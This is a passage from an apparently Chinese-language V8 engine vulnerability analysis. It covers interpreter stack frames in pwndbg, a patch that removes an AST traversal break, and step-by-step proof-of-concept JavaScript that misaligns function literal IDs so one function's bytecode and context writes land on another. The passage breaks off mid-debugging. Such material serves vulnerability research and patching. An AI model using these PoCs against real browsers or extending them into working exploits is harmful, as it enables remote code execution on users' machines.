&lt;Builtins_CallNoFeedbackHandler+48&gt;    movzx  r8d, byte ptr [r14 + r9 + 3]\n   0x7f04a307b876 &lt;Builtins_CallNoFeedbackHandler+54&gt;    movabs r10, 0x100000000\n ► 0x7f04a307b880 &lt;Builtins_CallNoFeedbackHandler+64&gt;    cmp    r10, r8\n   0x7f04a307b883 &lt;Builtins_CallNoFeedbackHandler+67&gt;    jae    Builtins_CallNoFeedbackHandler+82 &lt;Builtins_CallNoFeedbackHandler+82&gt;\n\n继续执行，这里开始取寄存器R1\n..........\n RCX  0xfffffffffffffffa\n RDX  0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 ◂— ...\n..........\n RBP  0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 ◂— ...\n..........\n*RIP  0x7f227e7e089c (Builtins_CallNoFeedbackHandler+92) ◂— mov    rcx, qword ptr [rdx + rcx*8]\n   0x7f227e7e0876 &lt;Builtins_CallNoFeedbackHandler+54&gt;     movabs r10, 0x100000000\n   0x7f227e7e0880 &lt;Builtins_CallNoFeedbackHandler+64&gt;     cmp    r10, r8\n   0x7f227e7e0883 &lt;Builtins_CallNoFeedbackHandler+67&gt;     jae    Builtins_CallNoFeedbackHandler+82 &lt;Builtins_CallNoFeedbackHandler+82&gt;\n    ↓\n   0x7f227e7e0892 &lt;Builtins_CallNoFeedbackHandler+82&gt;     mov    r11, qword ptr [rdx - 8]\n   0x7f227e7e0896 &lt;Builtins_CallNoFeedbackHandler+86&gt;     movsx  r9, byte ptr [r14 + r9 + 2]\n ► 0x7f227e7e089c &lt;Builtins_CallNoFeedbackHandler+92&gt;     mov    rcx, qword ptr [rdx + rcx*8]\n   0x7f227e7e08a0 &lt;Builtins_CallNoFeedbackHandler+96&gt;     lea    rbx, [rdx + r9*8]\n\n可以知道，这是从RBP开始向上偏移-6个单元取数据，也就是R1位于-6个单元处，这与我们前面的栈结构图相对应了，并且可以知道，虚拟机使用的是系统栈，而不是独立的栈。继续查看数据\npwndbg&gt; tel $rdx\n00:0000│ rdx r12 rbp 0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 ◂— ...\n01:0008│             0x7ffe9194e4b8 —▸ 0x7f227e2b2380 (Builtins_JSEntryTrampoline+96) ◂— cmp    qword ptr [rbp - 8], 0x20\n02:0010│             0x7ffe9194e4c0 —▸ 0x30703c601521 ◂— 0x210000196ee5507f\n03:0018│             0x7ffe9194e4c8 —▸ 0x423301ea31 ◂— 0x210000196ee55003\n04:0020│             0x7ffe9194e4d0 ◂— 0x20 /* &#39; &#39; */\n05:0028│             0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 —▸ 0x7ffe9194e8c0 —▸ 0x7ffe9194e960 ◂— ...\n06:0030│             0x7ffe9194e4e0 —▸ 0x7f227e2b210d (Builtins_JSEntry+141) ◂— mov    r10, qword ptr [r13 + 0x2e28]\n07:0038│             0x7ffe9194e4e8 ◂— 0x0\npwndbg&gt; job 0x30703c601521\n0x30703c601521: [JSGlobalProxy]\n - map: 0x196ee5507f79 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]\n - prototype: 0x00423301a5b9 &lt;JSObject&gt;\n - elements: 0x3938a2d00c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]\n - native context: 0x004233001749 &lt;NativeContext[247]&gt;\n - properties: 0x3938a2d00c21 &lt;FixedArray[0]&gt; &#123;&#125;\n\n现在我们跟踪进入fun函数，查看fun函数的栈结构\n ► 0x7f227e7b4e25 &lt;Builtins_StarHandler+37&gt;    mov    qword ptr [rdx + rbx*8], rax\n   0x7f227e7b4e29 &lt;Builtins_StarHandler+41&gt;    add    r9, 2\n   0x7f227e7b4e2d &lt;Builtins_StarHandler+45&gt;    movzx  ebx, byte ptr [r9 + r14]\npwndbg&gt; tel $rdx\n00:0000│ rdx rbp 0x7ffe9194e450 —▸ 0x7ffe9194e4b0 —▸ 0x7ffe9194e4d8 —▸ 0x7ffe9194e540 —▸ 0x7ffe9194e590 ◂— ...\n01:0008│         0x7ffe9194e458 —▸ 0x7f227e2bcd48 (Builtins_InterpreterEntryTrampoline+968) ◂— mov    r14, qword ptr [rbp - 0x18]\n02:0010│         0x7ffe9194e460 —▸ 0x3938a2d00709 ◂— 0x3938a2d006\n03:0018│         0x7ffe9194e468 —▸ 0x30703c601521 ◂— 0x210000196ee5507f\n04:0020│         0x7ffe9194e470 —▸ 0x3938a2d00709 ◂— 0x3938a2d006\n05:0028│         0x7ffe9194e478 —▸ 0x3938a2d004d1 ◂— 0x3938a2d005\n06:0030│         0x7ffe9194e480 —▸ 0x423301ead1 ◂— 0x210000196ee55003\n07:0038│         0x7ffe9194e488 —▸ 0x3938a2d004d1 ◂— 0x3938a2d005\npwndbg&gt; job 0x3938a2d00709\n#false\npwndbg&gt; job 0x30703c601521\n0x30703c601521: [JSGlobalProxy]\n - map: 0x196ee5507f79 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]\n - prototype: 0x00423301a5b9 &lt;JSObject&gt;\n - elements: 0x3938a2d00c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]\n - native context: 0x004233001749 &lt;NativeContext[247]&gt;\n - properties: 0x3938a2d00c21 &lt;FixedArray[0]&gt; &#123;&#125;\n\n从上述实验，我们大致理解了v8点虚拟机架构。现在，我们来讨论特殊的情况，即参数个数不匹配的情况。将测试代码稍作修改\nfunction fun(x) &#123;\n   var a = 0x666;\n   if (x) &#123;\n      print(&quot;hello&quot;);\n   &#125; else &#123;\n      print(&quot;world&quot;);\n   &#125;\n   return a;\n&#125;\n\n%DebugPrint(fun);\n%SystemBreak();\nfun(true);\nfun(false,0x666,0x123);\n\n然后以同样的调试方法进行调试，会发现流程会先进入ArgumentsAdaptorTrampoline\n ► 0x7fd81751dab2 &lt;Builtins_CallFunction_ReceiverIsAny+306&gt;    jmp    Builtins_ArgumentsAdaptorTrampoline &lt;Builtins_ArgumentsAdaptorTrampoline&gt;\n    ↓\n   0x7fd81751d580 &lt;Builtins_ArgumentsAdaptorTrampoline&gt;        cmp    rbx, 0xffff\n   0x7fd81751d587 &lt;Builtins_ArgumentsAdaptorTrampoline+7&gt;      je     Builtins_ArgumentsAdaptorTrampoline+244 &lt;Builtins_ArgumentsAdaptorTrampoline+244&gt;\n\n实际上，这是用于适配参数的中间处理函数，有了该函数后的栈结构如下\n                    +---------------------------------------------+---------+\n                    |               ...........                   |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                    R2                       |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |                    R1                       |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |                    R0                       |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |              Bytecode offset                |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |    Callee Frame\n                    |                                             |         +---------------------&gt;\n                    |              Bytecode Array                 |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |                 JSFunction                  |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                   Context                   |         |\n        RBP         |                                             |         |\n&lt;-----------------------------------------------------------------+         |\n                    |                                             |         |\n                    |         ArgumentsAdaptorTrampoline BP       |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |   Return to ArgumentsAdaptorTrampoline+xx   |         |\n                    |                                             |         |\n                    +-------------------------------------------------------+\n                    |                                             |         |\n                    |                  Argument 1                 |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                JSGlobalProxy                |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |     Adaptor Frame\n                    |                   .......                   |         +----------------------&gt;\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |                 Previous BP                 |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |                Return Address               |         |\n                    |                                             |         |\n                    +-------------------------------------------------------+\n                    |                                             |         |\n                    |                  Argument 3                 |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |                  Argument 2                 |         |\n                    |                                             |         |     Caller Frame\n                    +---------------------------------------------+         +----------------------&gt;\n                    |                                             |         |\n                    |                  Argument 1                 |         |\n                    +---------------------------------------------+         |\n                    |                                             |         |\n                    |                JSGlobalProxy                |         |\n                    |                                             |         |\n                    +---------------------------------------------+         |\n                    |                   ......                    |         |\n                    |                                             |         |\n                    +---------------------------------------------+---------+\n\n即ArgumentsAdaptorTrampoline会处理好参数后再去调用目标函数，这种匹配方式带来了便利性但是却增加了时间点消耗，在新版的v8中已经移除了这种参数适配器框架，改用了另一种简易的方法即参数倒置。\n0x02 漏洞分析利用patch 分析diff --git a/src/ast/ast-traversal-visitor.h b/src/ast/ast-traversal-visitor.h\nindex ac5f8f2f69..1d7c86f46b 100644\n--- a/src/ast/ast-traversal-visitor.h\n+++ b/src/ast/ast-traversal-visitor.h\n@@ -116,7 +116,7 @@ void AstTraversalVisitor&lt;Subclass&gt;::VisitStatements(\n   for (int i = 0; i &lt; stmts-&gt;length(); ++i) &#123;\n     Statement* stmt = stmts-&gt;at(i);\n     RECURSE(Visit(stmt));\n-    if (stmt-&gt;IsJump()) break;\n   &#125;\n &#125;\n\npatch中去掉了AstTraversalVisitor中的if (stmt-&gt;IsJump()) break;一句代码，我们先来分析一下如何才能到达这个漏洞点的地方。延迟编译CompileLazy的AST解析函数ParseFunction源码如下，\nFunctionLiteral* Parser::DoParseFunction(Isolate* isolate, ParseInfo* info,\n                                         const AstRawString* raw_name) &#123;\n............................\n    FunctionKind kind = info-&gt;function_kind();\n\n    if (IsArrowFunction(kind)) &#123;\n.............................\n\n      if (GetLastFunctionLiteralId() != info-&gt;function_literal_id() - 1) &#123;\n        if (has_error()) return nullptr;\n        // If there were FunctionLiterals in the parameters, we need to\n        // renumber them to shift down so the next function literal id for\n        // the arrow function is the one requested.\n        AstFunctionLiteralIdReindexer reindexer(\n            stack_limit_,\n            (info-&gt;function_literal_id() - 1) - GetLastFunctionLiteralId());\n        for (auto p : formals.params) &#123;\n          if (p-&gt;pattern != nullptr) reindexer.Reindex(p-&gt;pattern);\n          if (p-&gt;initializer() != nullptr) &#123;\n            reindexer.Reindex(p-&gt;initializer());\n          &#125;\n        &#125;\n        ResetFunctionLiteralId();\n        SkipFunctionLiterals(info-&gt;function_literal_id() - 1);\n      &#125;\n\n      Expression* expression = ParseArrowFunctionLiteral(formals);\n      // Scanning must end at the same position that was recorded\n      // previously. If not, parsing has been interrupted due to a stack\n      // overflow, at which point the partially parsed arrow function\n      // concise body happens to be a valid expression. This is a problem\n      // only for arrow functions with single expression bodies, since there\n      // is no end token such as &quot;&#125;&quot; for normal functions.\n      if (scanner()-&gt;location().end_pos == info-&gt;end_position()) &#123;\n        // The pre-parser saw an arrow function here, so the full parser\n        // must produce a FunctionLiteral.\n        DCHECK(expression-&gt;IsFunctionLiteral());\n        result = expression-&gt;AsFunctionLiteral();\n      &#125;\n    &#125; else if (IsDefaultConstructor(kind)) &#123;\n      DCHECK_EQ(scope(), outer);\n      result = DefaultConstructor(raw_name, IsDerivedConstructor(kind),\n                                  info-&gt;start_position(), info-&gt;end_position());\n    &#125; else &#123;\n      ZonePtrList&lt;const AstRawString&gt;* arguments_for_wrapped_function =\n          info-&gt;is_wrapped_as_function()\n              ? PrepareWrappedArguments(isolate, info, zone())\n              : nullptr;\n      result = ParseFunctionLiteral(\n          raw_name, Scanner::Location::invalid(), kSkipFunctionNameCheck, kind,\n          kNoSourcePosition, function_type, info-&gt;language_mode(),\n          arguments_for_wrapped_function);\n    &#125;\n...................\n&#125;\n\n其将函数类似分为了三种类别：箭头函数、构造函数、普通函数。如果箭头函数的参数里存在函数的定义的话，将会使用AstFunctionLiteralIdReindexer将这些函数的function_literal_id进行reindex确定顺序。而AstFunctionLiteralIdReindexer的源码如下\nvoid AstFunctionLiteralIdReindexer::Reindex(Expression* pattern) &#123;\n  Visit(pattern);\n&#125;\n\nvoid AstFunctionLiteralIdReindexer::VisitFunctionLiteral(FunctionLiteral* lit) &#123;\n  AstTraversalVisitor::VisitFunctionLiteral(lit);\n  lit-&gt;set_function_literal_id(lit-&gt;function_literal_id() + delta_);\n&#125;\n\n从代码我们可以知道，这个Reindex实际上就是在遍历AST语法树，如果遇到函数定义，就调用AstTraversalVisitor::VisitFunctionLiteral，然后为当前的FunctionLiteral设置新的function_literal_id，与原值的区别在于加上了一个delta_。AstTraversalVisitor::VisitFunctionLiteral代码如下，\ntemplate &lt;class Subclass&gt;\nvoid AstTraversalVisitor&lt;Subclass&gt;::VisitFunctionLiteral(\n    FunctionLiteral* expr) &#123;\n  PROCESS_EXPRESSION(expr);\n  DeclarationScope* scope = expr-&gt;scope();\n  RECURSE_EXPRESSION(VisitDeclarations(scope-&gt;declarations()));\n  // A lazily parsed function literal won&#39;t have a body.\n  if (expr-&gt;scope()-&gt;was_lazily_parsed()) return;\n  RECURSE_EXPRESSION(VisitStatements(expr-&gt;body()));\n&#125;\n\n这里会调用VisitStatements继续遍历函数里面的内容，而VisitStatements就是漏洞点所在的位置。由此我们要想达到漏洞点，需要有箭头函数，且参数里还需要有一个函数。\nPOC构造function fun(x) &#123;\n   var f = (v1 = (o)=&gt;&#123;print(&quot;hello&quot;);&#125;)=&gt;&#123;&#125;;\n   f();\n&#125;\n\nfun(true);\n\n首先f是一个箭头函数，而f箭头函数的参数里还有一个函数v1 = (o)=&gt;&#123;print(&quot;hello&quot;);&#125;，这样就能触发进入AstFunctionLiteralIdReindexer。为什么需要Reindex，因为解析是按照顺序的，fun的literal_id为1，而v1的literal_id为2，f的literal_id为3,但是v1的函数被调用的顺序不可能先于f，因为我们只能在f内部去调用v1（如var f = (v1 = (o)=&gt;&#123;print(&quot;hello&quot;);&#125;)=&gt;&#123;v1();&#125;;）。因此f得先被编译，因此需要将f的literal_id更正为2。现在需要研究一下漏洞是哪个，是什么造成了漏洞，Parser阶段结束后就是进入GenerateUnoptimizedCode遍历AST生成字节码，其中也有一个VisitStatements\nvoid BytecodeGenerator::VisitStatements(\n    const ZonePtrList&lt;Statement&gt;* statements) &#123;\n  for (int i = 0; i &lt; statements-&gt;length(); i++) &#123;\n    // Allocate an outer register allocations scope for the statement.\n    RegisterAllocationScope allocation_scope(this);\n    Statement* stmt = statements-&gt;at(i);\n    Visit(stmt);\n    if (builder()-&gt;RemainderOfBlockIsDead()) break;\n  &#125;\n&#125;\n\n其中的RemainderOfBlockIsDead代码如下\n  bool RemainderOfBlockIsDead() const &#123; return exit_seen_in_block_; &#125;\nvoid BytecodeArrayWriter::UpdateExitSeenInBlock(Bytecode bytecode) &#123;\n  switch (bytecode) &#123;\n    case Bytecode::kReturn:\n    case Bytecode::kThrow:\n    case Bytecode::kReThrow:\n    case Bytecode::kAbort:\n    case Bytecode::kJump:\n    case Bytecode::kJumpConstant:\n    case Bytecode::kSuspendGenerator:\n      exit_seen_in_block_ = true;\n      break;\n    default:\n      break;\n  &#125;\n\n我们再回过头看一下AstTraversalVisitor&lt;Subclass&gt;::VisitStatements阶段的break条件\nbool Statement::IsJump() const &#123;\n  switch (node_type()) &#123;\n#define JUMP_NODE_LIST(V) \\\n  V(Block)                \\\n  V(ExpressionStatement)  \\\n  V(ContinueStatement)    \\\n  V(BreakStatement)       \\\n  V(ReturnStatement)      \\\n  V(IfStatement)\n#define GENERATE_CASE(Node) \\\n  case k##Node:             \\\n    return static_cast&lt;const Node*&gt;(this)-&gt;IsJump();\n    JUMP_NODE_LIST(GENERATE_CASE)\n#undef GENERATE_CASE\n#undef JUMP_NODE_LIST\n    default:\n      return false;\n  &#125;\n&#125;\n\n对比发现IsJump中多了一个对IfStatement的判断。其中IfStatement中的IsJump()源码如下\nlass IfStatement final : public Statement &#123;\n public:\n..................\n  bool IsJump() const &#123;\n    return HasThenStatement() &amp;&amp; then_statement()-&gt;IsJump()\n        &amp;&amp; HasElseStatement() &amp;&amp; else_statement()-&gt;IsJump();\n  &#125;\n\n也就是这样的JS代码满足条件\nif (a) &#123;\n   return;\n&#125; else &#123;\n   return;\n&#125;\n\n即在if和else分支中都有控制流语句，当AstTraversalVisitor遍历语法树时遇到这样的语句，就会停止遍历，这意味着位于这样语句后面的函数将不会被reindex，仍然保持原来的literal_id。而BytecodeGenerator阶段遇到这样的语句不会break，继续生成后面的字节码。我们来构造这样一个样本，观察一下会发生什么\nfunction fun() &#123;\n   var f = (v1 = (o)=&gt;&#123;\n      var a = 0;\n      if (a) &#123;\n         return;\n      &#125; else &#123;\n         return;\n      &#125;\n      function f1() &#123;\n         print(&quot;f1&quot;);\n      &#125;\n      function f2() &#123;\n         print(&quot;f2&quot;)\n      &#125;\n   &#125;)=&gt;&#123;&#125;;\n   f();\n&#125;\n\nfun();\n\n语法树如下\n[generating bytecode for function: ]\n--- AST ---\nFUNC at 0\n. KIND 0\n. SUSPEND COUNT 0\n. NAME &quot;&quot;\n. INFERRED NAME &quot;&quot;\n. DECLS\n. . FUNCTION &quot;fun&quot; = function fun\n. EXPRESSION STATEMENT at 256\n. . ASSIGN at -1\n. . . VAR PROXY local[0] (0x55bd8d2babd0) (mode = TEMPORARY, assigned = true) &quot;.result&quot;\n. . . CALL\n. . . . VAR PROXY unallocated (0x55bd8d2baae0) (mode = VAR, assigned = true) &quot;fun&quot;\n. RETURN at -1\n. . VAR PROXY local[0] (0x55bd8d2babd0) (mode = TEMPORARY, assigned = true) &quot;.result&quot;\n\n[generating bytecode for function: fun]\n--- AST ---\nFUNC at 12\n. KIND 0\n. SUSPEND COUNT 0\n. NAME &quot;fun&quot;\n. DECLS\n. . VARIABLE (0x55bd8d2bc908) (mode = VAR, assigned = false) &quot;f&quot;\n. BLOCK NOCOMPLETIONS at -1\n. . EXPRESSION STATEMENT at 28\n. . . INIT at 28\n. . . . VAR PROXY local[0] (0x55bd8d2bc908) (mode = VAR, assigned = false) &quot;f&quot;\n. . . . FUNC LITERAL at 28\n. . . . . NAME f\n. . . . . INFERRED NAME f\n. EXPRESSION STATEMENT at 248\n. . CALL\n. . . VAR PROXY local[0] (0x55bd8d2bc908) (mode = VAR, assigned = false) &quot;f&quot;\n\n[generating bytecode for function: f]\n--- AST ---\nFUNC at 28\n. KIND 8\n. SUSPEND COUNT 0\n. NAME &quot;&quot;\n. PARAMS\n. . VAR (0x55bd8d2bfbe8) (mode = TEMPORARY, assigned = true) &quot;&quot;\n. DECLS\n. . VARIABLE (0x55bd8d2becb8) (mode = LET, assigned = false) &quot;v1&quot;\n. BLOCK NOCOMPLETIONS at -1\n. . EXPRESSION STATEMENT at -1\n. . . INIT at -1\n. . . . VAR PROXY local[0] (0x55bd8d2becb8) (mode = LET, assigned = false) &quot;v1&quot;\n. . . . CONDITIONAL at -1\n. . . . . CONDITION at -1\n. . . . . . EQ_STRICT at -1\n. . . . . . . VAR PROXY parameter[0] (0x55bd8d2bfbe8) (mode = TEMPORARY, assigned = true) &quot;&quot;\n. . . . . . . LITERAL undefined\n. . . . . THEN at 34\n. . . . . . FUNC LITERAL at 34\n. . . . . . . NAME v1\n. . . . . . . INFERRED NAME \n. . . . . ELSE at -1\n. . . . . . VAR PROXY parameter[0] (0x55bd8d2bfbe8) (mode = TEMPORARY, assigned = true) &quot;&quot;\n\n发现v1里面的内容并没有生成语法树，经过测试，发现要想强制让一个函数还没执行到的时候就解析，可以改成这种形式(function() &#123;......&#125;)即匿名函数的形式，同理，我们发现f1和f2的内容也没有解析，我们也一并解析，修改为如下:\nfunction fun() &#123;\n   var f = (v1 = (function() &#123;\n      var a = 0;\n      if (a) &#123;\n         return;\n      &#125; else &#123;\n         return;\n      &#125;\n      (function() &#123;\n         print(&quot;f1&quot;);\n      &#125;);\n      (function() &#123;\n         print(&quot;f2&quot;)\n      &#125;);\n   &#125;))=&gt;&#123;&#125;;\n   f();\n&#125;\n\nfun();\n\n这回AST就完整了\n[generating bytecode for function: v1]\n--- AST ---\nFUNC at 35\n. KIND 0\n. SUSPEND COUNT 0\n. NAME &quot;v1&quot;\n. INFERRED NAME &quot;&quot;\n. DECLS\n. . VARIABLE (0x55f955ee7f68) (mode = VAR, assigned = false) &quot;a&quot;\n. BLOCK NOCOMPLETIONS at -1\n. . EXPRESSION STATEMENT at 62\n. . . INIT at 62\n. . . . VAR PROXY local[0] (0x55f955ee7f68) (mode = VAR, assigned = false) &quot;a&quot;\n. . . . LITERAL 0\n. IF at 71\n. . CONDITION at 75\n. . . VAR PROXY local[0] (0x55f955ee7f68) (mode = VAR, assigned = false) &quot;a&quot;\n. . THEN at -1\n. . . BLOCK at -1\n. . . . RETURN at 89\n. . . . . LITERAL undefined\n. . ELSE at -1\n. . . BLOCK at -1\n. . . . RETURN at 121\n. . . . . LITERAL undefined\n. EXPRESSION STATEMENT at 143\n. . FUNC LITERAL at 144\n. . . NAME \n. . . INFERRED NAME \n. EXPRESSION STATEMENT at 195\n. . FUNC LITERAL at 196\n. . . NAME \n. . . INFERRED NAME \n\n[generating bytecode for function: ]\n--- AST ---\nFUNC at 144\n. KIND 0\n. SUSPEND COUNT 0\n. NAME &quot;&quot;\n. INFERRED NAME &quot;&quot;\n. EXPRESSION STATEMENT at 166\n. . CALL\n. . . VAR PROXY unallocated (0x55f955ee8e98) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;\n. . . LITERAL &quot;f1&quot;\n\n[generating bytecode for function: ]\n--- AST ---\nFUNC at 196\n. KIND 0\n. SUSPEND COUNT 0\n. NAME &quot;&quot;\n. INFERRED NAME &quot;&quot;\n. EXPRESSION STATEMENT at 218\n. . CALL\n. . . VAR PROXY unallocated (0x55f955ee8e98) (mode = DYNAMIC_GLOBAL, assigned = false) &quot;print&quot;\n. . . LITERAL &quot;f2&quot;\n\n运行时报错\n#\n# Fatal error in ../../src/objects.cc, line 4857\n# Check failed: fun-&gt;function_literal_id() &lt; shared_function_infos()-&gt;length() (6 vs. 6).\n\n我们来分析一下，在ast-traversal-visitor.h:119处（if (stmt-&gt;IsJump())break;）下断点\nIn file: /home/sea/Desktop/v8/src/ast/ast-traversal-visitor.h\n   114 void AstTraversalVisitor&lt;Subclass&gt;::VisitStatements(\n   115     const ZonePtrList&lt;Statement&gt;* stmts) &#123;\n   116   for (int i = 0; i &lt; stmts-&gt;length(); ++i) &#123;\n   117     Statement* stmt = stmts-&gt;at(i);\n   118     RECURSE(Visit(stmt));\n ► 119     if (stmt-&gt;IsJump()) break;\n   120   &#125;\n   121 &#125;\npwndbg&gt; p stmt-&gt;Print()\nIF at 71\n. CONDITION at 75\n. . VAR PROXY unresolved &quot;a&quot;\n. THEN at -1\n. . BLOCK at -1\n. . . RETURN at 89\n. . . . LITERAL undefined\n. ELSE at -1\n. . BLOCK at -1\n. . . RETURN at 121\n. . . . LITERAL undefined\n$8 = void\n\n此时遍历到了那个if语句，判断为IsJump，则后面点内容不再遍历。然后返回到这里更正unction_literal_id\n   23 void AstFunctionLiteralIdReindexer::VisitFunctionLiteral(FunctionLiteral* lit) &#123;\n   24   AstTraversalVisitor::VisitFunctionLiteral(lit);\n ► 25   lit-&gt;set_function_literal_id(lit-&gt;function_literal_id() + delta_);\n   26 &#125;\npwndbg&gt; p lit-&gt;function_literal_id()\n$9 = 5\npwndbg&gt; p delta_\n$10 = -3\n\n可见，这里只更正了f的index为2，而v1、f1、f2的index都还没更新，导致fun-&gt;function_literal_id()会比函数个数还大。现在来研究一下function_literal_id会对编译造成什么影响。在FinalizeUnoptimizedCode阶段，即字节码的最后阶段，有如下代码\n  // Finalize the inner functions&#39; compilation jobs.\n  for (auto&amp;&amp; inner_job : *inner_function_jobs) &#123;\n    Handle&lt;SharedFunctionInfo&gt; inner_shared_info =\n        Compiler::GetSharedFunctionInfo(\n            inner_job-&gt;compilation_info()-&gt;literal(), parse_info-&gt;script(),\n            isolate);\n    // The inner function might be compiled already if compiling for debug.\n    if (inner_shared_info-&gt;is_compiled()) continue;\n    if (FinalizeUnoptimizedCompilationJob(inner_job.get(), inner_shared_info,\n                                          isolate) !=\n        CompilationJob::SUCCEEDED) &#123;\n      return false;\n    &#125;\n  &#125;\n\n这里根据inner_job-&gt;compilation_info()-&gt;literal()取到了内部函数的FunctionLiteral对象，但记住因为漏洞的原因，它的literal_id没有更新，仍然为解析时的那个顺序，其中(function() &#123;          print(&quot;f2&quot;)       &#125;);的literal_id为7。显然，我们的字节码并没有7段，那么我们多增加几个函数\nfunction fun() &#123;\n   var f = (v1 = (function() &#123;\n      var a = 0;\n      if (a) &#123;\n         return;\n      &#125; else &#123;\n         return;\n      &#125;\n      (function() &#123;\n         print(&quot;f1&quot;);\n      &#125;);\n      (function() &#123;\n         print(&quot;f2&quot;)\n      &#125;);\n   &#125;))=&gt;&#123;&#125;;\n   f();\n&#125;\n\n\nfunction fun2() &#123;\n   fun();\n&#125;\n\nfunction fun3() &#123;\n   fun();\n&#125;\n\nfun2();\nfun3();\n\n下标7的位置函数正好是fun3函数\n[generated bytecode for function: ]\n............\n[generated bytecode for function: fun2]\n............\n[generated bytecode for function: fun]\n...........\n[generated bytecode for function: f]\n...........\n[generated bytecode for function: v1]\n...........\n[generated bytecode for function: ]\n...........\n[generated bytecode for function: ]\n..........\n[generated bytecode for function: fun3]\n\n这意味着取到的inner_shared_info将会是fun3的shared_info，而这里处理的函数实际上是(function() &#123;          print(&quot;f2&quot;)       &#125;);那么执行FinalizeUnoptimizedCompilationJob时\nCompilationJob::Status FinalizeUnoptimizedCompilationJob(\n    UnoptimizedCompilationJob* job, Handle&lt;SharedFunctionInfo&gt; shared_info,\n    Isolate* isolate) &#123;\n  UnoptimizedCompilationInfo* compilation_info = job-&gt;compilation_info();\n  ParseInfo* parse_info = job-&gt;parse_info();\n\n  SetSharedFunctionFlagsFromLiteral(compilation_info-&gt;literal(), shared_info);\n\n  CompilationJob::Status status = job-&gt;FinalizeJob(shared_info, isolate);\n  if (status == CompilationJob::SUCCEEDED) &#123;\n    InstallUnoptimizedCode(compilation_info, shared_info, parse_info, isolate);\n    CodeEventListener::LogEventsAndTags log_tag;\n    if (parse_info-&gt;is_toplevel()) &#123;\n      log_tag = compilation_info-&gt;is_eval() ? CodeEventListener::EVAL_TAG\n                                            : CodeEventListener::SCRIPT_TAG;\n    &#125; else &#123;\n      log_tag = parse_info-&gt;lazy_compile() ? CodeEventListener::LAZY_COMPILE_TAG\n                                           : CodeEventListener::FUNCTION_TAG;\n    &#125;\n    job-&gt;RecordFunctionCompilation(log_tag, shared_info, isolate);\n    job-&gt;RecordCompilationStats(isolate);\n  &#125;\n  return status;\n&#125;\n\n其中的InstallUnoptimizedCode会将(function() &#123;          print(&quot;f2&quot;)       &#125;);的字节码绑定到fun3函数对象上，也就是调用fun3时会调用(function() &#123;          print(&quot;f2&quot;)       &#125;);这说明这个漏洞导致了函数错位。除此之外还有什么影响呢？这将导致(function() &#123;          print(&quot;f2&quot;)       &#125;);函数使用的context将会是fun3的context。使用如下代码测试\nfunction fun() &#123;\n   var f = (v1 = (function() &#123;\n      var a = 0;\n      if (a) &#123;\n         return;\n      &#125; else &#123;\n         return;\n      &#125;\n      (function() &#123;\n         print(&quot;f1&quot;);\n      &#125;);\n      (function() &#123;\n         print(&quot;f2&quot;);\n         a = &quot;a&quot;.repeat(100);\n      &#125;);\n   &#125;))=&gt;&#123;&#125;;\n   f();\n&#125;\n\nlet arr = [1.1,2.2,3.3];\n\nfunction fun2() &#123;\n   fun();\n&#125;\n\nfunction fun3() &#123;\n   fun();\n&#125;\n\nfun2();\n%DebugPrint(fun);\n%SystemBreak();\nfun3();\n\n其中f2的字节码如下\nFrame size 24\n  204 E&gt; 0x21f372c1f542 @    0 : a5                StackCheck \n  218 S&gt; 0x21f372c1f543 @    1 : 13 00 00          LdaGlobal [0], [0]\n         0x21f372c1f546 @    4 : 26 fb             Star r0\n         0x21f372c1f548 @    6 : 12 01             LdaConstant [1]\n         0x21f372c1f54a @    8 : 26 fa             Star r1\n  218 E&gt; 0x21f372c1f54c @   10 : 5d fb fa 02       CallUndefinedReceiver1 r0, r1, [2]\n  240 S&gt; 0x21f372c1f550 @   14 : 12 02             LdaConstant [2]\n         0x21f372c1f552 @   16 : 26 fa             Star r1\n  248 E&gt; 0x21f372c1f554 @   18 : 28 fa 03 04       LdaNamedProperty r1, [3], [4]\n         0x21f372c1f558 @   22 : 26 fb             Star r0\n         0x21f372c1f55a @   24 : 0c 64             LdaSmi [100]\n         0x21f372c1f55c @   26 : 26 f9             Star r2\n  248 E&gt; 0x21f372c1f55e @   28 : 59 fb fa f9 06    CallProperty1 r0, r1, r2, [6]\n  242 E&gt; 0x21f372c1f563 @   33 : 1d 04             StaCurrentContextSlot [4]\n         0x21f372c1f565 @   35 : 0d                LdaUndefined \n  267 S&gt; 0x21f372c1f566 @   36 : a9                Return \nConstant pool (size = 4)\n\n我们在StaCurrentContextSlot字节码断点，因为这里会向context的第4个插槽写数据，也就是说这里在修改fun3的context内容。\n   0x7f4a3b433925 &lt;Builtins_StaCurrentContextSlotHandler+37&gt;     movabs r10, 0x100000000\n   0x7f4a3b43392f &lt;Builtins_StaCurrentContextSlotHandler+47&gt;     cmp    r10, rdx\n   0x7f4a3b433932 &lt;Builtins_StaCurrentContextSlotHandler+50&gt;     jae    Builtins_StaCurrentContextSlotHandler+65 